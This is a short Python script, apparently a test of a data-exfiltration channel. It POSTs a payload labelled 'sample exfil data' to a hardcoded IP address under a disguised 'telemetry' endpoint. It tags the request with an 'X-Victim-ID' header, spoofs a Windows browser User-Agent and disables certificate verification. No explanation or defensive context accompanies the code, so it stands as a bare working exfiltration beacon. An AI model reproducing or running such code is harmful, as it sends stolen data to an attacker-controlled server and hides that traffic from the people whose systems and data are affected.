
import requests
url = 'https://67.217.244.78/api/v1/telemetry'
headers = {
    'X-Victim-ID': 'testvictim',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
}
data = b'sample exfil data'
response = requests.post(url, headers=headers, data=data, verify=False)  # verify=False for self-signed cert
print('Status:', response.status_code)
print('Response:', response.text)
